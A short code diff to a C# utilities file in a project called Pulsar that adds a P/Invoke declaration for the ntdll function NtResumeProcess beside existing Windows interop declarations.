@@ -17,6 +17,9 @@ namespace Pulsar.Client.Utilities
             [MarshalAs(UnmanagedType.U4)] public UInt32 cbSize;
             [MarshalAs(UnmanagedType.U4)] public UInt32 dwTime;
         }
+
+        [DllImport("ntdll.dll", SetLastError = true)]
+        public static extern int NtResumeProcess(IntPtr processHandle);
         [DllImport("user32.dll")]
         internal static extern bool SetForegroundWindow(IntPtr hWnd);
 
